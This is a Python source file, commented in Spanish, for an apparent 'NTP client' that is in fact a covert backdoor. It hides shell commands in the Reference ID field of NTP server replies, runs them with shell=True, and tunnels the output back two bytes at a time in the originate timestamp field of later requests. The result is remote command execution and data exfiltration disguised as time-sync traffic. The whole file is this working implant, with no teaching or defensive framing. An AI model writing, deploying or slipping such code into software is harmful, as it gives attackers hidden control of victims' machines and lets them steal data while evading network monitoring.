import socket
import time
import struct
import subprocess
import sys
from datetime import datetime
from enum import Enum, auto


# ─────────────────────────────────────────────
#  Estados del cliente
# ─────────────────────────────────────────────
class EstadoCliente(Enum):
    IDLE               = auto()  # sin nada pendiente, envío normal
    RECIBIENDO_COMANDO = auto()  # acumulando fragmentos del comando
    ENVIANDO_RESPUESTA = auto()  # ejecutado el comando, devolviendo resultado


# ─────────────────────────────────────────────
#  Cliente
# ─────────────────────────────────────────────
class NTPClient:
    NTP_EPOCH_OFFSET = 2208988800

    def __init__(self, server_host, server_port=123, interval=10):
        self.server_host = server_host
        self.server_port = server_port
        self.interval    = interval
        self.running     = False

        # — estado —
        self.estado            = EstadoCliente.IDLE
        self.buffer_cmd        = bytearray()   # fragmentos del comando entrante
        self.resultado_bytes   = b''           # resultado codificado listo para enviar
        self.offset_resultado  = 0             # cuántos bytes ya enviamos
        self.ultimo_frag_cmd   = -1            # último num_frag de comando recibido

    # ─────────────────────────────────────────
    #  Bucle principal
    # ─────────────────────────────────────────
    def start(self):
        self.running = True
        print(f"🕐 Cliente NTP iniciado")
        print(f"📡 Servidor: {self.server_host}:{self.server_port}")
        print(f"⏱️  Intervalo: {self.interval}s\n")

        n = 0
        while self.running:
            try:
                n += 1
                print(f"📡 Petición #{n}  [estado={self.estado.name}]")
                self._send_request()

                for i in range(self.interval, 0, -1):
                    if not self.running:
                        break
                    print(f"⏳ Próxima en {i}s...", end='\r')
                    time.sleep(1)
                print(" " * 40, end='\r')

            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"❌ Error inesperado: {e}")
                time.sleep(self.interval)

    def stop(self):
        self.running = False
        print("\n🛑 Cliente detenido")

    # ─────────────────────────────────────────
    #  Envío + recepción de un paquete
    # ─────────────────────────────────────────
    def _send_request(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            packet, acaba_de_terminar = self._build_packet()
            sock.sendto(packet, (self.server_host, self.server_port))

            data, addr = sock.recvfrom(1024)
            sock.close()

            if len(data) >= 48:
                # Si acabamos de terminar el envío de respuesta en ESTE ciclo,
                # ignoramos el Reference ID que trae el servidor — puede ser el
                # fragmento 0 del próximo comando, y todavía no estamos en IDLE
                # desde el punto de vista del servidor. Lo recibiremos limpiamente
                # en el siguiente ciclo.
                self._procesar_respuesta(data, addr, ignorar_ref_id=acaba_de_terminar)

        except socket.timeout:
            print("⏰ Timeout — sin respuesta\n")
        except Exception as e:
            print(f"❌ Error: {e}\n")

    # ─────────────────────────────────────────
    #  Construir paquete saliente
    # ─────────────────────────────────────────
    def _build_packet(self) -> tuple[bytearray, bool]:
        """Devuelve (packet, acaba_de_terminar).
        acaba_de_terminar=True cuando en este ciclo terminamos de enviar la
        respuesta y hacemos la transición ENVIANDO_RESPUESTA → IDLE."""
        packet = bytearray(48)
        packet[0] = 0x23   # LI=0, VN=4, Mode=3 (client)
        acaba_de_terminar = False

        if self.estado == EstadoCliente.ENVIANDO_RESPUESTA:
            fragmento = self._siguiente_fragmento_resultado()
            if fragmento is not None:
                # Usamos originate timestamp (bytes 24-28) para llevar el marcador
                struct.pack_into('!I', packet, 24, 0xFFFFFFFF)
                struct.pack_into('!I', packet, 28, fragmento)
                print(f"   📤 Enviando fragmento resultado: {self._describe_frag(fragmento)}")
            else:
                # Acabamos de terminar — transición a IDLE.
                # Usamos una marca especial para que el servidor NO interprete
                # este paquete como ACK y no avance al siguiente fragmento.
                self._ir_a_idle()
                self._escribir_no_ack(packet)
                acaba_de_terminar = True
        else:
            self._escribir_datos_normales(packet)

        # Transmit timestamp (siempre)
        ts = self._ntp_timestamp()
        struct.pack_into('!I', packet, 40, ts >> 32)
        struct.pack_into('!I', packet, 44, ts & 0xFFFFFFFF)
        return packet, acaba_de_terminar

    def _escribir_datos_normales(self, packet):
        struct.pack_into('!I', packet, 24, 12345)
        struct.pack_into('!I', packet, 28, 67890)

    def _escribir_no_ack(self, packet):
        """Marca especial: le dice al servidor 'recibí tu respuesta pero
        aún no estoy listo para el siguiente fragmento — no avances'."""
        struct.pack_into('!I', packet, 24, 0xFFFFFFFE)
        struct.pack_into('!I', packet, 28, 0)

    # ─────────────────────────────────────────
    #  Procesar respuesta del servidor
    # ─────────────────────────────────────────
    def _procesar_respuesta(self, data: bytes, addr, ignorar_ref_id: bool = False):
        # Timestamps para mostrar hora
        tx_sec  = struct.unpack_from('!I', data, 40)[0]
        tx_frac = struct.unpack_from('!I', data, 44)[0]
        t3 = self._ntp_to_unix((tx_sec << 32) | tx_frac)
        print(f"✅ Respuesta de {addr[0]}:{addr[1]}")
        print(f"   Servidor: {datetime.fromtimestamp(t3)}  |  Local: {datetime.now()}")
        print(f"   Δ {(t3 - time.time())*1000:.2f} ms\n")

        # Si en este mismo ciclo acabamos de pasar a IDLE, el servidor aún no lo
        # sabe — puede venir el fragmento 0 del próximo comando. Lo ignoramos y
        # lo recibiremos limpiamente en el siguiente ciclo.
        if ignorar_ref_id:
            print("   ⏭️  Ciclo de transición → ignorando Reference ID")
            return

        # Reference ID — aquí va el fragmento del comando (si lo hay)
        ref_id = struct.unpack_from('!I', data, 12)[0]

        # Ignorar valor neutro ('GPS\x00') o si ya estamos enviando respuesta
        if ref_id == 0x47505300 or self.estado == EstadoCliente.ENVIANDO_RESPUESTA:
            return

        marca = (ref_id >> 24) & 0xFF
        if marca != 0xFF:
            return   # paquete normal, sin fragmento de comando

        self._procesar_fragmento_comando(ref_id)

    def _procesar_fragmento_comando(self, ref_id: int):
        num_frag = (ref_id >> 16) & 0xFF
        mas      = (ref_id >> 15) & 1
        datos    = ref_id & 0x7FFF
        byte1    = (datos >> 8) & 0xFF
        byte2    = datos & 0xFF

        # Primer fragmento: resetear buffer
        if num_frag == 0 or self.estado == EstadoCliente.IDLE:
            self.buffer_cmd      = bytearray()
            self.ultimo_frag_cmd = -1
            self.estado          = EstadoCliente.RECIBIENDO_COMANDO

        # Evitar duplicados
        if num_frag <= self.ultimo_frag_cmd:
            print(f"   ⚠️  Fragmento {num_frag} duplicado, ignorado")
            return

        self.ultimo_frag_cmd = num_frag

        if byte1:
            self.buffer_cmd.append(byte1)
        if byte2:
            self.buffer_cmd.append(byte2)

        print(f"   📥 Fragmento cmd {num_frag} (más={mas}): {bytes([byte1, byte2])}")

        if mas == 0:
            comando = self.buffer_cmd.decode('utf-8', errors='replace')
            print(f"   🚀 Comando completo: '{comando}'")
            self._ejecutar_comando(comando)

    def _ejecutar_comando(self, comando: str):
        try:
            r = subprocess.run(
                comando, shell=True, capture_output=True, text=True, timeout=10
            )
            salida = (r.stdout + r.stderr).encode()
        except Exception as e:
            salida = f"ERROR: {e}".encode()

        print(f"   ⚡ Ejecutado. Resultado: {salida[:60]!r}...")

        self.resultado_bytes  = salida
        self.offset_resultado = 0
        self.estado           = EstadoCliente.ENVIANDO_RESPUESTA

    # ─────────────────────────────────────────
    #  Fragmentación del resultado
    # ─────────────────────────────────────────
    def _siguiente_fragmento_resultado(self):
        """Devuelve el valor de 32 bits para el siguiente fragmento, o None si hemos terminado."""
        if self.offset_resultado >= len(self.resultado_bytes):
            return None

        byte1 = self.resultado_bytes[self.offset_resultado]
        self.offset_resultado += 1

        if self.offset_resultado < len(self.resultado_bytes):
            byte2 = self.resultado_bytes[self.offset_resultado]
            self.offset_resultado += 1
        else:
            byte2 = 0

        # mas=1 si aún quedan bytes por enviar, mas=0 si este es el último fragmento
        mas = 1 if self.offset_resultado < len(self.resultado_bytes) else 0

        datos_frag = (byte1 << 8) | byte2
        # num_frag basado en la posición (0-indexed por par de bytes)
        num_frag = (self.offset_resultado // 2) - 1
        if num_frag < 0:
            num_frag = 0

        if mas == 0:
            # Marcar como "terminando" — en el próximo ciclo iremos a IDLE
            pass

        return (0xFF << 24) | (num_frag << 16) | (mas << 15) | datos_frag

    def _ir_a_idle(self):
        print("   ✅ Respuesta enviada completamente → IDLE")
        self.estado           = EstadoCliente.IDLE
        self.resultado_bytes  = b''
        self.offset_resultado = 0
        self.buffer_cmd       = bytearray()
        self.ultimo_frag_cmd  = -1

    # ─────────────────────────────────────────
    #  Helpers NTP
    # ─────────────────────────────────────────
    def _ntp_timestamp(self) -> int:
        t        = time.time() + self.NTP_EPOCH_OFFSET
        seconds  = int(t)
        fraction = int((t - seconds) * 2**32)
        return (seconds << 32) | fraction

    def _ntp_to_unix(self, ntp: int) -> float:
        seconds  = ntp >> 32
        fraction = ntp & 0xFFFFFFFF
        return (seconds - self.NTP_EPOCH_OFFSET) + (fraction / 2**32)

    @staticmethod
    def _describe_frag(val: int) -> str:
        num_frag = (val >> 16) & 0xFF
        mas      = (val >> 15) & 1
        datos    = val & 0x7FFF
        b1       = (datos >> 8) & 0xFF
        b2       = datos & 0xFF
        return f"frag={num_frag} más={mas} bytes={bytes([b1, b2])}"


# ─────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python ntp-client.py <servidor> [intervalo]")
        sys.exit(1)

    servidor  = sys.argv[1]
    intervalo = int(sys.argv[2]) if len(sys.argv) > 2 else 10

    client = NTPClient(server_host=servidor, interval=intervalo)
    try:
        client.start()
    except KeyboardInterrupt:
        client.stop()